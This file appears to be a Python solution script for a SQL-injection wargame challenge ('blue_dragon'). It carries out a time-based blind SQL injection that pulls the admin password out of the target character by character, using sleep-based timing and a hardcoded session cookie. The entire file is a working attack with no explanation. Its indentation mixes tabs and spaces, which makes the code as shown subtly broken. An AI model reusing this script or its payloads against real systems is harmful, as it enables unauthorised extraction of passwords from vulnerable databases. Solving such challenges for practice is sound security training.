import requests
import time

url = "https://los.rubiya.kr/chall/blue_dragon_23f2e3c81dca66e496c7de2d63b82984.php?pw="
session = {'PHPSESSID':'j0cgcafpm5c9vtqu3nuuvr3fn8'}
payload2 = ""
'''
for i in range(1,50):
	payload = "' or id='admin' and if(length(pw)="+str(i)+",sleep(2),0)%23"
	start = time.time()
	print(url+payload)
	request = requests.post(url+payload, cookies=session)
	end = time.time()
	if end-start > 2:
		print("length : "+str(i))
		leng = i
		break
'''

for i in range(1,9):
    for j in range(48,123):
	start = time.time()
        payload="' or id='admin' and if(ord(substr(pw,"+str(i)+",1))="+str(j)+",sleep(2),0)%23"
        #print(str(i)+" payload = "+url+payload)
        request = requests.post(url+payload, cookies=session)
	end = time.time()
        if end-start > 2: 
            flag = 0
            print(request.text)
            break
        else:
            flag = 1
            continue
    payload2 = payload2 + chr(j)
    print(payload2)
print("DONE!! :"+payload2)

